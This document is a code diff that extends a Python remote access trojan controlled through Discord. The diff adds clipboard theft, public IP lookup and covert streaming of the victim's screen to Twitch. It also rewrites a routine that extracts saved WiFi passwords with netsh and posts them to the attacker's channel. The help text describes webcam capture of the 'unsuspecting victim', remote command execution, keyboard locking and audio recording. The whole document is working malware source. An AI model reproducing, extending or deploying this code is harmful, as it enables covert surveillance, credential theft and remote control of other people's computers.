@@ -14,6 +14,7 @@ import sounddevice as sd
 from scipy.io.wavfile import write
 from discord.ext import commands
 from pynput.keyboard import Controller, Key
+import pyperclip
 
 # Initialize global variables
 TOKEN = ""
@@ -93,6 +94,14 @@ async def on_message(message):
             await handle_help(message)
         elif message.content.startswith('type'):
             await handle_typing(message)
+        elif message.content.startswith('copy'):
+            await handel_clipboard_copy(message)
+        elif message.content.startswith('clipboard'):
+            await handel_clipboard_get(message)
+        elif message.content.startswith('ip'):
+            await handel_get_ip(message)
+        elif message.content.startswith('stream'):
+            await handel_stream_twitch(message)
     else:
         await message.channel.send("You are not authorized to use this bot.")
 
@@ -149,19 +158,44 @@ async def handle_screenshot(message):
     os.remove("screenshot.png")
 
 async def handle_wifi(message):
-    networks = []
+    networks, out = [], ''
+    wifis = []
+
     try:
-        wifi_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True).decode('utf-8')
-        profiles = [line.split(":")[1].strip() for line in wifi_profiles.split('\n') if "All User Profile" in line]
-        for profile in profiles:
-            details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], shell=True).decode('utf-8')
-            password = [line.split(":")[1].strip() for line in details.split('\n') if "Key Content" in line]
-            networks.append((profile, password[0] if password else ''))
-    except Exception as e:
-        networks.append(("Error", str(e)))
-    output = "\n".join(f"{name}: {pwd}" for name, pwd in networks)
-    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"```{output}```")
-    webhook.execute()
+        wifi = subprocess.check_output(
+            ['netsh', 'wlan', 'show', 'profiles'], shell=True,
+            stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
+        wifi = [i.split(":")[1][1:-1]
+                for i in wifi if "All User Profile" in i]
+        wifis = len(networks)
+
+        for name in wifi:
+            try:
+                results = subprocess.check_output(
+                    ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
+                    stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
+                results = [b.split(":")[1][1:-1]
+                            for b in results if "Key Content" in b]
+                
+            except subprocess.CalledProcessError:
+                networks.append((name, ''))
+                continue
+
+            try:
+                networks.append((name, results[0]))
+            except IndexError:
+                networks.append((name, ''))
+
+    except subprocess.CalledProcessError:
+        pass
+    except UnicodeDecodeError:
+        pass
+
+    out += f'{"SSID":<20}| {"PASSWORD":<}\n'
+    out += f'{"-"*20}|{"-"*29}\n'
+    for name, password in networks:
+        out += '{:<20}| {:<}\n'.format(name, password)
+    await(message.channel.send(f"```{out}```"))
 
 async def handle_download(message):
     _, url, filename = message.content.split()
@@ -207,19 +241,24 @@ async def handle_record(message):
 async def handle_help(message):
     embed = discord.Embed(title="Commands", description="Available commands:", color=0x00ff00)
     commands = [
-        ("help", "Show this help message"),
-        ("command <cmd>", "Execute command and return output"),
-        ("com <cmd>", "Execute command without output"),
-        ("cam", "Take a picture using webcam"),
-        ("lock <seconds>", "Lock keyboard and mouse"),
-        ("screenshot", "Take a screenshot"),
-        ("wifi", "Get saved WiFi passwords"),
-        ("download <url> <filename>", "Download file"),
-        ("sys", "Get system info"),
-        ("play <url> <seconds>", "Play audio"),
-        ("web <url>", "Open website"),
-        ("record <seconds>", "Record audio")
-    ]
+    ("help", "shows a list of all commands"),
+    ("command <command>", "send a command in the target computer and receive the output"),
+    ("com <command>", "send a command in the target computer without receiving the output"),
+    ("cam", "take a picture of the unsuspecting victim :)"),
+    ("lock <time>", "locks the target's keyboard and mouse for the specified amount of time"),
+    ("screenshot", "sends you a screenshot of the target computer"),
+    ("wifi", "gives you a list of all saved WiFi passwords on the target device"),
+    ("download <url> <file_name>", "downloads the file at the URL into the target computer"),
+    ("sys", "gives you the specs of the target computer"),
+    ("play <url> <time_to_close_player>", "play an audio file provided in the link on the target computer"),
+    ("web <url>", "opens the URL in the target computer's browser"),
+    ("record <time>", "records an audio file on the target computer and sends it to you"),
+    ("type <text>", "types the text on the target computer, use '[]' for key combinations"),
+    ("copy <text>", "copies the text to the clipboard"),
+    ("clipboard", "gets the text from the clipboard"),
+    ("ip", "gets the IP address of the target computer"),
+    ("stream <stream_key>", "streams the target computer's screen to Twitch")
+]
     for name, desc in commands:
         embed.add_field(name=name, value=desc, inline=False)
     await message.channel.send(embed=embed)
@@ -236,6 +275,75 @@ async def handle_typing(message):
             text = text[end + 1:]
         else:
             keyboard.type(char)
+async def handel_clipboard_copy(message):
+    text = message.content.replace('copy ', '')
+    pyperclip.copy(text)
 
+async def handel_clipboard_get(message):
+    text = message.content.replace('paste ', '')
+    await message.channel.send(pyperclip.waitForPaste())
+
+async def handel_get_ip(message):
+    ip = requests.get('https://api.ipify.org?format=json').text
+    await message.channel.send(f'IP(v4): {ip}')
+    ip = requests.get('https://api64.ipify.org?format=json').text
+    await message.channel.send(f'IP(v6): {ip}')
+    
+    
+async def handel_stream_twitch(message):
+    stream_key = message.content.replace('stream ', '')
+    await message.channel.send(f'Streaming...')
+    TWITCH_URL = "rtmp://live.twitch.tv/app/"
+    STREAM_KEY = stream_key  # Replace with your Twitch Stream Key
+
+    # FFmpeg command to stream
+    ffmpeg_cmd = [
+        "ffmpeg",
+        "-y",  # Overwrite output files
+        "-f", "rawvideo",  # Input format
+        "-vcodec", "rawvideo",
+        "-pix_fmt", "bgr24",  # Pixel format
+        "-s", "1280x720",  # Frame size
+        "-r", "30",  # Frame rate
+        "-i", "-",  # Input comes from stdin
+        "-c:v", "libx264",  # Encode in H.264
+        "-pix_fmt", "yuv420p",  # Pixel format for output
+        "-preset", "veryfast",  # Encoding speed/quality trade-off
+        "-f", "flv",  # Output format
+        TWITCH_URL + STREAM_KEY
+    ]
+
+    # Start FFmpeg process
+    process = subprocess.Popen(ffmpeg_cmd, stdin=subprocess.PIPE)
+
+    # Initialize screen capture using mss
+    with mss.mss() as sct:
+        # Define the monitor to capture (primary monitor)
+        monitor = sct.monitors[1]  # You can change this to sct.monitors[x] if needed
+
+        try:
+            while True:
+                # Capture the screen
+                screenshot = sct.grab(monitor)
+
+                # Convert the raw screenshot to a NumPy array
+                frame = np.array(screenshot)
+
+                # Convert BGRA to BGR (drop alpha channel)
+                frame = frame[:, :, :3]
+
+                # Resize to 1920x1080
+                frame = cv2.resize(frame, (1280, 720))
+
+                # Write frame to FFmpeg process
+                process.stdin.write(frame.tobytes())
+
+        except KeyboardInterrupt:
+            print("Streaming stopped by user.")
+
+        finally:
+            # Cleanup
+            process.stdin.close()
+            process.wait()
 # Start the bot
 client.run(TOKEN)
